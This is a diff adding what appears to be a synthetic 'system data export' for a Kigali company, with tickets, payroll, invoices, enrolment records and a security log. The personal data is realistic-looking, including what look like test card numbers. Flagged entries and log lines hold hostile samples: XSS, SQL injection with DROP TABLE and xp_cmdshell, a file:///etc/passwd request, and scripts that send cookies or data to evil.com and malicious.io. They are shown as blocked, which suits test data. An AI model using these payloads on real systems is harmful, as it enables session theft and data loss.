@@ -1,0 +1,404 @@
+KIGALI TECH SOLUTIONS - SYSTEM DATA EXPORT
+date: 2024-03-15 (auto-generated, do not edit manually)
+*** some records may be incomplete - database migration in progress ***
+
+================================================================
+
+james.mutabazi@gmail.com called AGAIN about his bill. said he was charged
+RWF 325,000 but should have been RWF162500. card he used was 4532 1234 5678 9010.
+his number +250 788 345 678. told him we'd call back before 5pm. ticket 3021
+#BillingIssue #DoubleCharge
+-- note added by kevin.nziza@si.alueducation.com at 9:47am
+
+================================================================
+
+fwd: email from amara.diallo@alumni.alueducation.com
+"hi, i submitted a request for my transcript 3 weeks ago and still nothing.
+i paid the processing fee (RWF 19,500) on the portal and have the receipt.
+can someone please help? my number is +1 (415) 867-5309 if you need to reach me.
+thanks
+amara"
+assigned to: kevin.nziza@si.alueducation.com
+ref portal http://portal.alueducation.com/alumni/access
+ticket 3022 RESOLVED
+#AlumniRequest #Transcript
+
+================================================================
+
+linda.osei@yahoo.com -- subscription renewal failing since tuesday
+phone +44 7911 123456
+card 5105 1051 0510 5100 keeps getting declined
+renewal amt RWF 129,987
+she says she tried 3x already
+support URL: https://support.kigalitech.com/billing?ref=3023
+ticket 3023 still OPEN
+someone pls look at this today #SubscriptionFailed #RenewalError
+
+================================================================
+
+!!! FLAGGED ENTRY - DO NOT PROCESS !!!
+came in thru contact form at 3:12am
+name: [blank]
+email: NOT_AN_EMAIL@@broken..com
+phone: 000-000-0000
+card: 1234-FAKE-CARD-ABCD
+amount: RWF FREEMONEY
+message body contained: <script>alert('xss attack')</script>
+also found: ' OR 1=1; DROP TABLE customers;--
+url they submitted: javascript:void(document.cookie)
+ticket 3024 AUTO-FLAGGED
+#Flagged #SecurityAlert
+
+================================================================
+
+pascal.habimana@gmail.com
++250 733 210 987
+card 4916 3384 0951 2461 was charged RWF 442,000 but payment
+page showed error. he wants full refund RWF442000
+see: https://support.kigalitech.com/refunds?ticket=3025
+ticket 3025 OPEN HIGH PRIORITY
+#CardDeclined #RefundRequest
+
+================================================================
+
+chidi.okeke@outlook.com / also reachable at chidi.okeke@si.alueducation.com
+ph: +234 802 345 6789
+cant login to student portal since yesterday -- password reset not working either
+owes RWF 260,000 for registration, payment on hold until access restored
+portal: https://students.alueducation.com/login
+ticket 3026 IN PROGRESS
+#LoginIssue #StudentPortal
+
+================================================================
+
+from: fatima.traore@alumni.alueducation.com
+"hello, i paid RWF 65,000 for my alumni certificate two months ago
+and it has not arrived. card used was 3782 822463 10005.
+please check receipt at https://alumni.alueducation.com/certificates/receipt?id=3027
+my phone is +223 76 12 34 56"
+ticket 3027 RESOLVED (certificate was sent to wrong address - resent)
+#Certificate #AlumniIssue
+
+================================================================
+
+CRITICAL FLAG - ticket 3028
+submission at 2:03am from hacker@@evil..org
+phone given: +000 000 0000
+card entered: 0000 0000 0000 0000
+amount field: -RWF 9,999,999
+html found in message: <img src=x onerror=alert('hack')>
+url attempt: file:///etc/passwd
+sql string: '; EXEC xp_cmdshell('dir');--
+IP BLOCKED. entry discarded.
+#Flagged #CriticalThreat
+
+================================================================
+
+nguyen.thi@gmail.com says she was billed RWF 227,500 but
+expected RWF 208,000 -- possible currency config issue on her account
+card 6011 0009 9013 9424, ph +84 91 234 5678
+help center ticket logged: https://support.kigalitech.com/currency-issues
+ticket 3029 OPEN #CurrencyMismatch #BillingError
+
+================================================================
+
+marie.claire@orange.fr
+ph: +33 7 56 34 12 89
+invoice PDF wont load on her phone (android, chrome)
+she is on the RWF 38,987/month plan
+account: https://kigalitech.com/account/marie-claire
+ticket 3030 open - low priority
+#TechnicalIssue #MobileAccess
+
+================================================================
+================================================================
+
+STAFF / PAYROLL - Q1 2024
+(exported from HR system - some entries still being verified)
+
+================================================================
+
+Dr Grace Uwimana - Head of Finance
+grace.uwimana@alueducation.com
++250 722 987 654
+salary: RWF 4,160,000/month
+emergency contact +250 788 001 122
+-- payroll confirmed march 2024
+
+================================================================
+
+Brian Otieno
+IT Support Lead
+brian.otieno@si.alueducation.com | personal: b.otieno94@hotmail.com
++254 701 456 789
+monthly: RWF 3,640,000
+-- note: pending laptop replacement request RWF 780,000 awaiting approval
+
+================================================================
+
+sophie.marchand@alumni.alueducation.com -- Alumni Relations Officer
+mob: +33 6 12 34 56 78
+contract: RWF 1,950,000
+profile https://alueducation.com/staff/sophie-marchand
+contract renewal due april 2024
+
+================================================================
+
+Emmanuel Nkurunziza / Software Engineer
+e.nkurunziza@alueducation.com
+personal email emma.nkuru@gmail.com
+ph +250 788 432 109
+salary RWF 3,380,000
+github https://github.com/enkurunziza
+-- currently on 2 week leave, back march 29
+
+================================================================
+
+aisha.kamara@si.alueducation.com
+Student Affairs Coordinator
+Sierra Leone office: +232 76 543 210
+emergency: +232 77 654 321
+pay: RWF 2,730,000 monthly
+
+================================================================
+
+David Mensah -- Data Analyst
+d.mensah@alumni.alueducation.com
+also uses david.mensah.gh@gmail.com
++233 244 567 890
+contract RWF 3,900,000
+linkedin: https://linkedin.com/in/davidmensah-data
+contract ends june 2024
+
+================================================================
+
+Rosa Ntamutumba - Comms Manager
+r.ntamutumba@alueducation.com
++250 782 334 556
+annual bonus approved: RWF 2,340,000
+https://alueducation.com/team/rosa-ntamutumba
+
+================================================================
+
+INVALID RECORD - failed integrity check
+email: not-valid@@staff..alu.com
+phone: 99999999999
+salary: RWF FREE
+-- rejected by HR system, do not process
+
+================================================================
+================================================================
+
+VENDOR INVOICES
+(some still awaiting finance sign-off)
+
+================================================================
+
+CloudPrint Africa
+accounts@cloudprintafrica.com
+ph +250 788 765 432
+inv total: RWF 16,250,000
+tax 16% = RWF 2,600,000
+GRAND TOTAL RWF 18,850,000
+card: 3714 496353 98431
+pay here: https://payments.cloudprintafrica.com/inv/0091
+INV-0091 -- approved by grace.uwimana@alueducation.com
+#Invoice #VendorPayment #Q1
+
+================================================================
+
+billing@nairobiwebservices.co.ke -- INV-0092
+nairobi web services
++254 720 333 444
+subtotal RWF 6,175,650
+discount -RWF 617,565
+due: RWF 5,558,085
+card 6011 1111 1111 1117
+receipt: https://nairobiwebservices.co.ke/receipts?id=0092
+#Hosting #WebServices
+
+================================================================
+
+** DO NOT PAY ** INV-0093 FLAGGED
+vendor unknown
+contact: free.money@@scam..net
+ph: 1234567
+amount: RWF 0 FREE!!!
+card: 9999-9999-9999-9999
+link submitted: http://totally-not-a-scam.ru/click?ref=steal
+REJECTED by fraud detection
+#Flagged #FraudAlert
+
+================================================================
+
+Accra Cloud Storage Ltd
+invoices@accracloud.com.gh
++233 302 123 789
+inv: RWF 11,570,000
+tax 15%: RWF 1,735,500
+total: RWF 13,305,500
+card 5425 2334 3010 9903
+https://accracloud.com.gh/pay?invoice=0094
+INV-0094
+#CloudStorage #VendorPayment #Q1
+
+================================================================
+
+Lagos Print & Design Co
+finance@lagosprintdesign.ng / +234 803 987 6543
+subtotal RWF 4,160,000 + shipping RWF 195,000
+total RWF 4,355,000
+card: 4916 0387 9983 7546
+inv page: https://lagosprintdesign.ng/invoices/0095
+INV-0095 #Design #Printing
+
+================================================================
+
+INV-0096 !! UNDER REVIEW !!
+QuickCash Supplies
+getmoney@@quickcash..biz
+phone: 0000000000
+they are asking for RWF 129,998,700 ??? way too high
+card they gave: 1111-2222-3333-XXXX
+url in their email: javascript:fetch('http://malicious.io/steal?data=all')
+finance flagged this -- do not process
+#Flagged #UnderReview
+
+================================================================
+================================================================
+
+STUDENT ENROLLMENT RECORDS
+exported 2024-03-15 -- records marked * still need verification
+
+================================================================
+
+STU-10045 Olivier Habimana
+o.habimana@gmail.com
++250 789 123 456
+BSc Computer Science
+tuition RWF 6,760,000 -- PAID
+card 4532 0151 1283 0366
+portal: https://enroll.alueducation.com/stu/10045
+#Enrollment #TuitionPaid
+
+================================================================
+
+STU-10046
+zainab.musa@alumni.alueducation.com
++234 815 432 765
+MBA re-enrollment
+tuition RWF 8,840,000
+scholarship applied -RWF 1,950,000
+balance due: RWF 6,890,000
+card used: 5312 3456 7891 0123
+https://enroll.alueducation.com/stu/10046
+#Enrollment #Scholarship #MBA
+
+================================================================
+
+kofi asante -- STU-10047
+k.asante@si.alueducation.com
+ph +233 244 876 543
+MSc Data Science
+tuition RWF 6,370,000 -- PAYMENT PENDING
+card 4024 0071 3560 0236
+portal https://enroll.alueducation.com/stu/10047
+#Enrollment #PendingPayment
+
+================================================================
+
+* STU-10048 INVALID
+email: student@@.broken
+phone: 00000
+tuition: RWF FREE EDUCATION
+card: NOTACARD-1234
+rejected during validation sweep -- do not enroll
+
+================================================================
+
+STU-10049 Priya Nair
+priya.nair@outlook.com
++91 98765 43210
+BSc Business Admin
+tuition RWF 5,850,000
+late fee RWF 97,500
+TOTAL DUE: RWF 5,947,500
+card 3714 496353 98431
+https://alueducation.com/students/priya-nair
+#Enrollment #LateFee
+
+================================================================
+================================================================
+
+INTERNAL MEMO -- forwarded from admin inbox
+
+from: admin@alueducation.com
+to: all-staff@alueducation.com
+sent: 2024-03-15
+
+Q1 budget summary + procurement update
+
+team,
+
+numbers below for your reference. full report at
+https://drive.alueducation.com/reports/q1-2024
+
+    total expenditure:      RWF 113,646,000
+    carry-over approved:    RWF 19,500,000
+    pending invoices:       RWF 8,093,735
+    emergency reserve:      RWF 13,000,000
+    equipment budget:       RWF 28,600,000
+    training fund:          RWF 7,150,000
+    marketing:              RWF 11,375,000
+
+anything above RWF 650,000 needs finance desk sign-off.
+contact grace.uwimana@alueducation.com or call +250 722 987 654
+
+IT procurement goes through brian.otieno@si.alueducation.com
+helpdesk: https://it.alueducation.com/helpdesk
+
+#Budget #Q1 #Finance #Announcement #Procurement
+
+================================================================
+================================================================
+
+SYSTEM SECURITY LOG -- 2024-03-15
+(auto-generated -- do not modify)
+
+================================================================
+
+08:12:34 INFO login ok -- admin@alueducation.com -- IP 197.243.10.45
+
+08:45:11 WARN failed login -- unknown@@.com -- IP 185.220.101.33
+
+09:03:22 CRITICAL injection detected
+payload: <script>document.location='http://evil.com?c='+document.cookie</script>
+IP 192.168.0.1 BLOCKED
+
+09:15:00 INFO password reset -- linda.osei@yahoo.com -- reset link sent
+
+09:44:55 WARN sql injection in form field
+payload: admin'--; SELECT * FROM users WHERE '1'='1
+IP 45.33.32.156 BLOCKED
+
+10:02:17 INFO INV-0091 approved -- grace.uwimana@alueducation.com
+amt RWF 18,850,000 -- card 3714 496353 98431
+
+10:30:45 INFO new staff profile -- aisha.kamara@si.alueducation.com
+phone +232 76 543 210
+
+11:05:30 WARN unsafe url in support ticket
+url: javascript:void(document.cookie)
+action: REJECTED
+
+11:22:14 INFO bulk payment done
+total RWF 40,658,085 -- 4 cards charged
+processed by brian.otieno@si.alueducation.com
+
+12:00:00 INFO daily backup ok
+location: https://backup.alueducation.com/2024-03-15
+#Backup #SystemLog #Security
+
+================================================================
+END OF EXPORT -- KIGALI TECH SOLUTIONS LTD
+================================================================
